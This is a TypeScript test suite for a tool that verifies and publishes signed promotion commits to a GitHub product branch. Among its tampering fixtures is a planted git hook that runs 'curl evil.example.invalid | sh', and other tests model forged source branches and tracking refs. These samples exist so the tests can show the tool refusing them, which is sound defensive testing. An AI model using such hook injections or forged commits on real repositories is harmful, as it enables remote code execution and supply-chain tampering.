/**
 * THE PRODUCT PUBLICATION (`src/workflow/forge/publish/`, the verb in
 * `promotion/context.ts`): a promotion the verb builds itself, checked against
 * the projection recomputed from its source, carried to the forge through the
 * Git Data API as a commit GitHub signs, the product branch moved only
 * forward, and the projection receipt.
 *
 * The forge is `git-forge.ts`: the fake GitHub with Git Data routes answered
 * by a real bare repository. Each compare-and-swap barrier (the blob id, the
 * tree, the signature, `force: false`, the head check, the re-read) has a test
 * that goes red when the barrier is removed.
 */
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import test from "node:test";

import type { GitRepository } from "../../../src/git/tree-reader.ts";
import { VERIFICATION_PATHS } from "../../../src/kernel/verification-paths.ts";
import { githubWorkspaceForge } from "../../../src/workflow/workspace-forge-github.ts";
import { isForgeError } from "../../../src/workflow/forge/codes.ts";
import { remakeCommit } from "../../../src/workflow/workspace-forge.ts";
import { publishProduct, receiptBytes, type ProjectionReceipt } from "../../../src/workflow/forge/publish/product.ts";
import { PromotionError } from "../../../src/workflow/promotion/codes.ts";
import { forgePublishWith, resolvePromotionContext, resolveRepositoryContext, verifyBuiltProjection, verifyProductCommit, verifyTarget } from "../../../src/workflow/promotion/context.ts";
import { formatPromoteArguments, parsePromoteArguments } from "../../../src/workflow/promotion/promote-arguments.ts";
import { promotionRefs } from "../../../src/workflow/promotion/promotion-run.ts";
import { createTempDir } from "../../support/temp-dir.ts";
import { testGitIdentityEnvironment } from "../../support/test-git-identity.ts";
import { PROFILE_NAME, PROFILE_PATH, SOURCE, TARGET, json, type PromotionFixture } from "../../workflow/promotion/promotion-fixture.ts";
import { apply, documentOf, fixtureRun, landing } from "../../workflow/promotion/apply-support.ts";
import { gitForge, type GitForge } from "./git-forge.ts";

const REPOSITORY = "owner/product-repo";
const BRANCH = "product";

type World = Readonly<{ forge: GitForge; local: GitRepository; source: string; target: string; commit: string; git: (args: readonly string[]) => string }>;

/** A local repository with a `main` commit S and the product tip T (both on the forge) and the promotion commit C (parents [T, S]), which the forge does not hold yet. */
function world(prefix: string): World {
  const root = createTempDir(`${prefix}-local-`);
  const environment = { ...process.env, ...testGitIdentityEnvironment() };
  const git = (args: readonly string[], env: NodeJS.ProcessEnv = {}): string => execFileSync("git", ["-c", "gc.auto=0", ...args], { cwd: root, encoding: "utf8", env: { ...environment, ...env } }).trim();
  git(["init", "-q", "-b", "main"]);
  writeFileSync(join(root, "app.ts"), "export const app = 1;\n");
  writeFileSync(join(root, "dev.ts"), "export const dev = 1;\n");
  git(["add", "."]);
  git(["commit", "-q", "-m", "main: the first source"]);
  git(["checkout", "-q", "--orphan", BRANCH]);
  git(["rm", "-q", "--cached", "dev.ts"]);
  git(["commit", "-q", "-m", "the seeded product"]);
  const target = git(["rev-parse", "HEAD"]);
  git(["checkout", "-q", "-f", "main"]);
  writeFileSync(join(root, "app.ts"), "export const app = 2;\n");
  writeFileSync(join(root, "new.ts"), "export const fresh = 1;\n");
  git(["add", "."]);
  git(["commit", "-q", "-m", "main: the next source"]);
  const source = git(["rev-parse", "HEAD"]);
  const forge = gitForge(prefix, REPOSITORY);
  git(["push", "-q", forge.bare, "main", BRANCH]);
  const env = { GIT_INDEX_FILE: join(createTempDir(`${prefix}-index-`), "index") };
  git(["read-tree", `${target}^{tree}`], env);
  for (const path of ["app.ts", "new.ts"]) git(["update-index", "--add", "--cacheinfo", `100644,${git(["rev-parse", `${source}:${path}`])},${path}`], env);
  const commit = git(["commit-tree", git(["write-tree"], env), "-p", target, "-p", source, "-m", `promote main ${source.slice(0, 8)}\n\nProjected-From: ${source}\nPromotion-Profile: main-to-product@0123456`]);
  return { forge, local: { root, executable: "git", timeoutMs: 30_000 }, source, target, commit, git: (args) => git(args) };
}

async function refusedWith(code: string, run: () => Promise<unknown>): Promise<PromotionError> {
  try {
    await run();
  } catch (error) {
    assert.ok(error instanceof PromotionError, `expected a promotion refusal, got ${String(error)}`);
    assert.equal(error.promotionCode, code, error.message);
    return error;
  }
  assert.fail(`expected ${code}`);
}


const adapter = (w: World) => githubWorkspaceForge(w.forge.forge.client, { owner: REPOSITORY.split("/")[0]!, name: REPOSITORY.split("/")[1]! });
const head = (w: World): string => w.forge.git(["rev-parse", `refs/heads/${BRANCH}`]);
const publish = (w: World, commit = w.commit): Promise<ProjectionReceipt> => publishProduct({ client: w.forge.forge.client, repository: REPOSITORY, branch: BRANCH, local: w.local, commit });

test("the built promotion is re-made on the forge as a signed commit holding the built tree; the branch moves forward; the receipt names it", async () => {
  const w = world("publish-happy");
  const receipt = await publish(w);
  const published = head(w);
  assert.equal(receipt.commit, published);
  assert.notEqual(published, w.commit, "the forge made its own (signed) commit");
  assert.equal(w.forge.git(["rev-parse", `${published}^{tree}`]), w.git(["rev-parse", `${w.commit}^{tree}`]), "the published tree is the built tree");
  assert.deepEqual(w.forge.git(["rev-list", "--parents", "-n", "1", published]).split(" ").slice(1), [w.target, w.source]);
  assert.match(w.forge.git(["log", "-1", "--format=%B", published]), new RegExp(`Projected-From: ${w.source}`, "u"));
  assert.deepEqual({ ...receipt }, { schema: "bridlewise-product-projection/v1", repository: REPOSITORY, branch: BRANCH, commit: published, built: w.commit, tree: receipt.tree, source: w.source, profile: "main-to-product@0123456", target: w.target });
  assert.equal(w.forge.count("blobs"), w.git(["diff-tree", "-r", "--no-renames", "--diff-filter=AM", "--name-only", w.target, w.commit]).split("\n").filter((line) => line.length > 0).length, "only the changed blobs are uploaded");
  const moves = w.forge.fake.requests.filter((request) => request.path === "/graphql" && String((request.body as { query: string }).query).includes("updateRefs")).map((request) => (request.body as { variables: { before: string; after: string; force: boolean } }).variables);
  assert.deepEqual(moves.map((move) => [move.before, move.after, move.force]), [[w.target, published, false]], "the product moves forward only, from T: never forced");
});

test("a product branch that moved since the build is refused, and nothing is written", async () => {
  const w = world("publish-moved");
  const other = w.git(["commit-tree", w.git(["rev-parse", `${w.target}^{tree}`]), "-p", w.target, "-m", "another publication"]);
  w.git(["push", "-q", w.forge.bare, `${other}:refs/heads/${BRANCH}`]);
  await refusedWith("promotion_forge_target_moved", () => publish(w));
  assert.equal(w.forge.count("blobs") + w.forge.count("trees") + w.forge.count("commits") + w.forge.count("refs"), 0);
  assert.equal(head(w), other);
});

test("BARRIERS of the re-make: a wrong blob id, a tree other than the built one, an unsigned commit — each an integrity refusal, the branch unmoved", async () => {
  for (const knob of ["wrongBlob", "wrongTree", "unverified"] as const) {
    const w = world(`publish-${knob}`);
    w.forge.knobs[knob] = true;
    await refusedWith("promotion_forge_mismatch", () => publish(w));
    assert.equal(head(w), w.target, `${knob}: the product branch did not move`);
    assert.equal(w.forge.count("refs"), 0, `${knob}: no ref update was asked`);
    if (knob !== "unverified") assert.equal(w.forge.count("commits"), 0, `${knob}: refused before any commit is made on the forge`);
  }
});

test("BARRIER the compare-and-swap: a branch that no longer names the expected head is never moved, and nothing overwrites it", async () => {
  const w = world("publish-cas");
  const moved = w.git(["commit-tree", w.git(["rev-parse", `${w.target}^{tree}`]), "-p", w.target, "-m", "moved meanwhile"]);
  w.git(["push", "-q", w.forge.bare, `${moved}:refs/heads/${BRANCH}`]);
  const onTop = w.git(["commit-tree", w.git(["rev-parse", `${w.target}^{tree}`]), "-p", moved, "-m", "a descendant of the moved head"]);
  w.git(["push", "-q", w.forge.bare, `${onTop}:refs/heads/scratch`]);
  const set = await adapter(w).setBranch({ branch: BRANCH, sha: onTop, previous: w.target, forwardOnly: true });
  assert.deepEqual(set, { applied: false }, "a move from a head the branch no longer names is refused, even a fast-forward");
  assert.equal(head(w), moved);
  const sent = w.forge.fake.requests.filter((request) => request.path === "/graphql" && String((request.body as { query: string }).query).includes("updateRefs")).map((request) => (request.body as { variables: { before: string; force: boolean } }).variables);
  assert.deepEqual(sent.map((update) => [update.before, update.force]), [[w.target, false]], "the move names its expected head and never forces");
  assert.equal(w.forge.fake.requests.some((request) => request.method === "PATCH"), false, "REST PATCH (no compare-and-swap) is never used");
});

test("BARRIER only forward: a move to a commit that does not descend from the head is refused", async () => {
  const w = world("publish-forward");
  const unrelated = w.git(["commit-tree", w.git(["rev-parse", `${w.source}^{tree}`]), "-m", "no common history"]);
  w.git(["push", "-q", w.forge.bare, `${unrelated}:refs/heads/scratch`]);
  await assert.rejects(() => adapter(w).setBranch({ branch: BRANCH, sha: unrelated, previous: w.target, forwardOnly: true }), (error: unknown) => isForgeError(error, "github_validation_failed"), "GitHub refuses a move that is not a fast-forward");
  assert.equal(head(w), w.target, "a forced move would now name the unrelated commit");
});

test("BARRIER the read-back: a branch move the forge answers but never applies is an integrity refusal", async () => {
  const w = world("publish-reread");
  w.forge.knobs.ignoreRefUpdate = true;
  await refusedWith("promotion_forge_mismatch", () => publish(w));
  assert.equal(head(w), w.target);
});

test("only a promotion commit is published: no trailers, or parents other than [tip, source], is refused before any request", async () => {
  const w = world("publish-unproven");
  const tree = w.git(["rev-parse", `${w.commit}^{tree}`]);
  const plain = w.git(["commit-tree", tree, "-p", w.target, "-p", w.source, "-m", "no trailers"]);
  const swapped = w.git(["commit-tree", tree, "-p", w.source, "-p", w.target, "-m", `promote\n\nProjected-From: ${w.source}\nPromotion-Profile: main-to-product@0123456`]);
  for (const commit of [plain, swapped]) await refusedWith("promotion_source_unproven_commit", () => publish(w, commit));
  assert.equal(w.forge.fake.requests.length, 0);
});

test("the forge's refusals keep their class: a failure is errored, a permission refusal is refused", async () => {
  const errored = world("publish-errored");
  errored.forge.fake.refuseNext({ method: "POST", path: /\/git\/blobs$/u }, { status: 503, message: "unavailable" });
  assert.equal((await refusedWith("promotion_forge_errored", () => publish(errored))).facts["forgeCode"], "github_unavailable");
  const refused = world("publish-refused");
  refused.forge.fake.refuseNext({ method: "POST", path: /^\/graphql$/u }, { status: 403, message: "Resource not accessible by integration" });
  await refusedWith("promotion_forge_refused", () => publish(refused));
  assert.equal(head(refused), refused.target);
});

test("remakeCommit carries a commit whose parents the forge already holds, with the local message, and never an author", async () => {
  const w = world("publish-remake");
  const made = await remakeCommit(adapter(w), w.local, w.commit, (parent) => parent, new Set());
  assert.equal(made.verified, true);
  for (const request of w.forge.fake.requests.filter((entry) => entry.path.endsWith("/git/commits"))) {
    const body = request.body as Record<string, unknown>;
    assert.deepEqual([body["author"], body["committer"], body["signature"]], [undefined, undefined, undefined]);
  }
});

/** A LANDING fixture (it builds and settles candidates) whose `dev` (source) and `prod` (product) branches are on a git-backed forge. */
function fixtureWithForge(prefix: string): Readonly<{ fixture: PromotionFixture; forge: GitForge; context: () => ReturnType<typeof resolvePromotionContext> }> {
  const fixture = landing(prefix);
  const forge = gitForge(prefix, REPOSITORY);
  fixture.git(["push", "-q", forge.bare, SOURCE, TARGET]);
  fixture.git(["checkout", "-q", SOURCE]);
  return { fixture, forge, context: () => resolvePromotionContext(fixture.root, PROFILE_NAME, SOURCE, documentOf(fixture, false)) };
}

/** `commit` re-made with `changes` to its tree (a `null` deletes), the same parents, and `profile` (default: its own trailers) — a build that departs from the projection. */
function tampered(fixture: PromotionFixture, commit: string, changes: Readonly<Record<string, string | null>>, profile?: string): string {
  const env = { GIT_INDEX_FILE: join(createTempDir("publish-tamper-index-"), "index") };
  fixture.git(["read-tree", `${commit}^{tree}`], env);
  for (const [path, content] of Object.entries(changes)) {
    if (content === null) { fixture.git(["update-index", "--force-remove", path], env); continue; }
    const blob = execFileSync("git", ["hash-object", "-w", "--stdin"], { cwd: fixture.root, input: content, encoding: "utf8" }).trim();
    fixture.git(["update-index", "--add", "--cacheinfo", `100755,${blob},${path}`], env);
  }
  const message = fixture.git(["log", "-1", "--format=%B", commit]);
  const parents = fixture.git(["rev-list", "--parents", "-n", "1", commit]).split(" ").slice(1).flatMap((parent) => ["-p", parent]);
  return fixture.git(["commit-tree", fixture.git(["write-tree"], env), ...parents, "-m", profile === undefined ? message : message.replace(/Promotion-Profile: \S+/u, `Promotion-Profile: ${profile}`)]);
}

async function builtByTheFixture(fixture: PromotionFixture): Promise<string> {
  const answered = await apply(fixture);
  assert.equal(answered.code, "promotion_committed", answered.message);
  return (answered.data as { commit: string }).commit;
}

test("the publisher's check: the built tree must EQUAL the projection recomputed from S alone — no path is special — under the profile read from S", async () => {
  const { fixture, context } = fixtureWithForge("publish-verify");
  const run = fixtureRun(fixture);
  const built = await builtByTheFixture(fixture);
  await verifyBuiltProjection(context(), run, built);
  const plants: ReadonlyArray<readonly [string, Readonly<Record<string, string | null>>]> = [
    ["an excluded file", { "dev/tool.ts": "export const leaked = 1;\n" }],
    ["internal notes", { "NOTES.md": "internal\n" }],
    ["a shipped hook replaced (hook injection)", { ".githooks/pre-commit": "#!/bin/sh\ncurl evil.example.invalid | sh\n" }],
    ["a hook added", { ".githooks/reference-transaction": "#!/bin/sh\nexit 0\n" }],
    ["a generated output with arbitrary content", { "gen/pin.txt": "not the generator's output\n" }],
    ["a wholly generated path the projection does not hold", { "engine/src/architecture-manifest.ts": "export {};\n", [`engine/${VERIFICATION_PATHS.testInventory}`]: "{}\n", "engine/traceability/test-surface-dispositions/live%2Fmcp-servers.test.ts.json": "{}\n" }],
    ["a shipped file removed", { "product/main.ts": null }],
  ];
  for (const [why, changes] of plants) {
    const error = await refusedWith("promotion_forge_projection_mismatch", () => verifyBuiltProjection(context(), run, tampered(fixture, built, changes)));
    assert.deepEqual([...(error.facts["paths"] as string[])].sort(), Object.keys(changes).sort(), `${why}: each differing path named`);
  }
  await refusedWith("promotion_forge_profile_mismatch", () => verifyBuiltProjection(context(), run, tampered(fixture, built, {}, `${PROFILE_NAME}@0000000`)));
  await refusedWith("promotion_forge_profile_mismatch", () => verifyBuiltProjection(context(), run, tampered(fixture, built, {}, `another-profile@${fixture.loaded().blob!}`)));
});

test("the verb builds the promotion itself: a pending commit planted earlier is dropped and never carried; the build is checked, published, and its receipt written", async () => {
  const { fixture, forge, context } = fixtureWithForge("publish-verb");
  const planted = tampered(fixture, await builtByTheFixture(fixture), { "dev/tool.ts": "export const leaked = 1;\n" });
  fixture.git(["update-ref", promotionRefs(PROFILE_NAME).pending, planted]);
  const out = join(createTempDir("publish-verb-out-"), "receipt.json");
  const answered = await forgePublishWith(context(), parsePromoteArguments(["forge-publish", "--out", out]), forge.forge, fixtureRun(fixture));
  assert.equal(answered.code, "promotion_forge_published", answered.message);
  const receipt = JSON.parse(readFileSync(out, "utf8")) as ProjectionReceipt;
  assert.equal(receipt.commit, forge.git(["rev-parse", `refs/heads/${TARGET}`]));
  assert.notEqual(receipt.built, planted, "the planted pending commit was dropped, never carried");
  assert.throws(() => forge.git(["cat-file", "-e", `${receipt.commit}:dev/tool.ts`]), "the excluded file never reached the forge");
  assert.equal(readFileSync(out, "utf8"), receiptBytes(receipt));
});

test("a build that refuses is the verb's refusal, and nothing reaches the forge", async () => {
  const { fixture, forge, context } = fixtureWithForge("publish-build-refused");
  fixture.mark("gate-mode", "exit1");
  await refusedWith("promotion_gate_failed", () => forgePublishWith(context(), parsePromoteArguments(["forge-publish", "--out", join(createTempDir("publish-refused-out-"), "r.json")]), forge.forge, fixtureRun(fixture)));
  assert.equal(forge.fake.requests.length, 0);
});

test("the grammar: forge-publish needs --out, takes --source and the reasoned overrides a first promotion needs, and spells back to itself", () => {
  assert.throws(() => parsePromoteArguments(["forge-publish"]), (error: unknown) => error instanceof PromotionError && error.promotionCode === "promotion_usage");
  assert.throws(() => parsePromoteArguments(["plan", "--out", "x"]), (error: unknown) => error instanceof PromotionError && error.promotionCode === "promotion_usage");
  assert.throws(() => parsePromoteArguments(["forge-publish", "--out", "x", "--allow-deletions"]), (error: unknown) => error instanceof PromotionError && error.promotionCode === "promotion_usage", "an override needs its reason");
  const request = parsePromoteArguments(["forge-publish", "--profile", "main-to-product", "--source", "HEAD", "--out", "receipt.json", "--accept-target-edits", "README.md", "--allow-deletions", "--reason", "the seeded product's first projection"]);
  assert.deepEqual([request.allowDeletions, request.acceptTargetEdits, request.reason], [true, ["README.md"], "the seeded product's first projection"]);
  assert.deepEqual(parsePromoteArguments(formatPromoteArguments(request)), request);
});

test("verify (P4.1's check): a product commit is the projection of the main commit its trailer names, recomputed here from that commit alone", async () => {
  const fixture = landing("publish-verify", {}, { remote: true });
  fixture.publish(SOURCE);
  const built = await builtByTheFixture(fixture);
  const repository = resolveRepositoryContext(fixture.root, documentOf(fixture, false));
  const run = fixtureRun(fixture);
  const named = verifyTarget(repository, { verb: "verify", commit: built });
  assert.deepEqual([named.commit, named.context.source, named.profile], [built, fixture.tip(SOURCE), `${PROFILE_NAME}@${fixture.loaded().blob!}`]);
  const verified = await verifyProductCommit(named.context, named.commit, run);
  assert.equal(verified.code, "promotion_verified", verified.message);
  // The default is the target's tip: the product as it stands.
  fixture.git(["update-ref", `refs/heads/${TARGET}`, built]);
  assert.equal(verifyTarget(repository, { verb: "verify" }).commit, built);
  // A product commit that departs from the recompute names each path.
  const planted = tampered(fixture, built, { "dev/tool.ts": "export const leaked = 1;\n" });
  const departed = await refusedWith("promotion_forge_projection_mismatch", () => verifyProductCommit(verifyTarget(repository, { verb: "verify", commit: planted }).context, planted, run));
  assert.deepEqual(departed.facts["paths"], ["dev/tool.ts"]);
  // No trailers: no promotion commit at all.
  await refusedWith("promotion_source_unproven_commit", async () => verifyTarget(repository, { verb: "verify", commit: fixture.git(["rev-list", "--max-parents=0", TARGET]).split("\n")[0]! }));
  // A source that is not a commit of the source branch: projected from somewhere else.
  const elsewhere = fixture.git(["commit-tree", fixture.git(["rev-parse", `${fixture.tip(SOURCE)}^{tree}`]), "-m", "not on the source branch"]);
  const offSource = fixture.git(["commit-tree", fixture.git(["rev-parse", `${built}^{tree}`]), "-p", fixture.git(["rev-parse", `${built}^1`]), "-p", elsewhere, "-m", `promote\n\nProjected-From: ${elsewhere}\nPromotion-Profile: ${PROFILE_NAME}@${fixture.loaded().blob!}`]);
  await refusedWith("promotion_verify_off_source", async () => verifyTarget(repository, { verb: "verify", commit: offSource }));
  await refusedWith("promotion_usage", async () => verifyTarget(repository, { verb: "verify", commit: "no-such-revision" }));
});

test("the grammar: verify takes --commit (and --source, as the promoter home spells it back), nothing else of another verb's", () => {
  const request = parsePromoteArguments(["verify", "--profile", "main-to-product", "--commit", "product", "--source", "HEAD"]);
  assert.deepEqual([request.verb, request.commit, request.source], ["verify", "product", "HEAD"]);
  assert.deepEqual(parsePromoteArguments(formatPromoteArguments(request)), request);
  for (const argv of [["verify", "--out", "x"], ["plan", "--commit", "x"], ["verify", "--reason", "x"], ["verify", "--allow-deletions"]]) {
    assert.throws(() => parsePromoteArguments(argv), (error: unknown) => error instanceof PromotionError && error.promotionCode === "promotion_usage", argv.join(" "));
  }
});

test("SECURITY (planted): verify takes its trust from THIS checkout — a branch whose own profile names itself the source, and a forged product commit projected from it, are refused", async () => {
  const fixture = landing("publish-verify-forged-source", {}, { remote: true });
  fixture.publish(SOURCE);
  const built = await builtByTheFixture(fixture);
  // The attacker's branch: the source's content, its profile rewritten to call ITSELF the source branch.
  fixture.git(["branch", "evil", fixture.tip(SOURCE)]);
  const profile = JSON.parse(fixture.git(["show", `${SOURCE}:${PROFILE_PATH}`])) as { source: { ref: string } };
  fixture.commit("evil", { [PROFILE_PATH]: json({ ...profile, source: { ...profile.source, ref: "refs/heads/evil" } }), "product/lib/helper.ts": "export const helper = 666;\n" }, "a source of my own");
  const evil = fixture.tip("evil");
  const blob = fixture.git(["rev-parse", `${evil}:${PROFILE_PATH}`]);
  // A product commit "projected" from it, as a forger would make it.
  const forged = fixture.git(["commit-tree", fixture.git(["rev-parse", `${built}^{tree}`]), "-p", fixture.git(["rev-parse", `${built}^1`]), "-p", evil, "-m", `promote\n\nProjected-From: ${evil}\nPromotion-Profile: ${PROFILE_NAME}@${blob}`]);
  fixture.git(["checkout", "-q", SOURCE]);
  const repository = resolveRepositoryContext(fixture.root, documentOf(fixture, false));
  const refused = await refusedWith("promotion_verify_off_source", async () => verifyTarget(repository, { verb: "verify", commit: forged }));
  assert.deepEqual([refused.facts["source"], refused.facts["sourceRef"]], [evil, `refs/heads/${SOURCE}`], "the source branch is this checkout's, never the forged source's own");
  // A product commit naming a profile this checkout does not declare is refused before any source is read.
  const otherProfile = fixture.git(["commit-tree", fixture.git(["rev-parse", `${built}^{tree}`]), "-p", fixture.git(["rev-parse", `${built}^1`]), "-p", fixture.tip(SOURCE), "-m", `promote\n\nProjected-From: ${fixture.tip(SOURCE)}\nPromotion-Profile: another-profile@${blob}`]);
  await refusedWith("promotion_forge_profile_mismatch", async () => verifyTarget(repository, { verb: "verify", commit: otherProfile }));
  // The genuine promotion still verifies.
  const genuine = verifyTarget(repository, { verb: "verify", commit: built });
  assert.equal((await verifyProductCommit(genuine.context, genuine.commit, fixtureRun(fixture))).code, "promotion_verified");
});

/** A product commit naming `source` as its Projected-From, as a forger or a genuine build would write it (the tree is the built one: only the trailers are judged here). */
function productCommitFrom(fixture: PromotionFixture, built: string, source: string): string {
  return fixture.git(["commit-tree", fixture.git(["rev-parse", `${built}^{tree}`]), "-p", fixture.git(["rev-parse", `${built}^1`]), "-p", source, "-m", `promote\n\nProjected-From: ${source}\nPromotion-Profile: ${PROFILE_NAME}@${fixture.loaded().blob!}`]);
}

test("SECURITY (planted): a commit merged into the source branch from a side branch is no landing — only the first-parent line counts", async () => {
  const fixture = landing("publish-verify-first-parent", {}, { remote: true });
  fixture.publish(SOURCE);
  const built = await builtByTheFixture(fixture);
  // The attacker's side line: an evil change, reverted, merged with --no-ff, so the source branch's TREE never shows it.
  fixture.git(["checkout", "-q", "-b", "side", fixture.tip(SOURCE)]);
  fixture.commit("side", { "product/lib/helper.ts": "export const helper = 666; // evil\n" }, "evil");
  const evil = fixture.tip("side");
  fixture.git(["revert", "--no-edit", evil]);
  fixture.git(["checkout", "-q", SOURCE]);
  fixture.git(["merge", "-q", "--no-ff", "--no-edit", "side"]);
  fixture.publish(SOURCE);
  const repository = resolveRepositoryContext(fixture.root, documentOf(fixture, false));
  assert.equal(fixture.git(["merge-base", "--is-ancestor", evil, SOURCE]) === "", true, "the evil commit IS an ancestor of the source branch");
  const refused = await refusedWith("promotion_verify_off_source", async () => verifyTarget(repository, { verb: "verify", commit: productCommitFrom(fixture, built, evil) }));
  assert.match(refused.message, /first-parent/u);
  // The merge itself is a landing: a product commit from it passes the source check.
  assert.equal(verifyTarget(repository, { verb: "verify", commit: productCommitFrom(fixture, built, fixture.tip(SOURCE)) }).context.source, fixture.tip(SOURCE));
});

test("SECURITY (planted): the source branch is trusted only as its remote publishes it now — a local branch ahead or behind, a forged tracking ref, an unreachable remote, or no remote at all is refused", async () => {
  const fixture = landing("publish-verify-unconfirmed", {}, { remote: true });
  fixture.publish(SOURCE);
  const built = await builtByTheFixture(fixture);
  const repository = resolveRepositoryContext(fixture.root, documentOf(fixture, false));
  assert.equal(verifyTarget(repository, { verb: "verify", commit: built }).commit, built, "local equals the published branch");
  // A local commit on the source branch that was never published.
  fixture.commit(SOURCE, { "product/lib/helper.ts": "export const helper = 9;\n" }, "local only");
  const unconfirmed = await refusedWith("promotion_verify_source_unconfirmed", async () => verifyTarget(repository, { verb: "verify", commit: productCommitFrom(fixture, built, fixture.tip(SOURCE)) }));
  assert.deepEqual([unconfirmed.facts["local"], unconfirmed.facts["published"]], [fixture.tip(SOURCE), fixture.remoteGit(["rev-parse", `refs/heads/${SOURCE}`])]);
  // The remote moves on while this repository's tracking ref is made to agree with local: the remote itself is read, never the tracking ref.
  const local_ = fixture.tip(SOURCE);
  fixture.publish(SOURCE);
  const ahead = fixture.git(["commit-tree", fixture.git(["rev-parse", `${local_}^{tree}`]), "-p", local_, "-m", "published elsewhere"]);
  fixture.git(["push", "-q", "origin", `${ahead}:refs/heads/${SOURCE}`]);
  fixture.git(["update-ref", `refs/remotes/origin/${SOURCE}`, local_]);
  const stale = await refusedWith("promotion_verify_source_unconfirmed", async () => verifyTarget(repository, { verb: "verify", commit: productCommitFrom(fixture, built, local_) }));
  assert.deepEqual([stale.facts["local"], stale.facts["published"]], [local_, ahead], "what the remote publishes, not the forged tracking ref");
  // An unreachable remote is a typed refusal, never a fallback to the local copy.
  fixture.git(["remote", "set-url", "origin", join(createTempDir("publish-verify-gone-"), "no-such-remote.git")]);
  await refusedWith("promotion_verify_remote_unreachable", async () => verifyTarget(repository, { verb: "verify", commit: productCommitFrom(fixture, built, local_) }));
  // A profile that names no remote has nothing to confirm against.
  const local = landing("publish-verify-no-remote");
  const localBuilt = await builtByTheFixture(local);
  await refusedWith("promotion_verify_source_unconfirmed", async () => verifyTarget(resolveRepositoryContext(local.root, documentOf(local, false)), { verb: "verify", commit: localBuilt }));
});
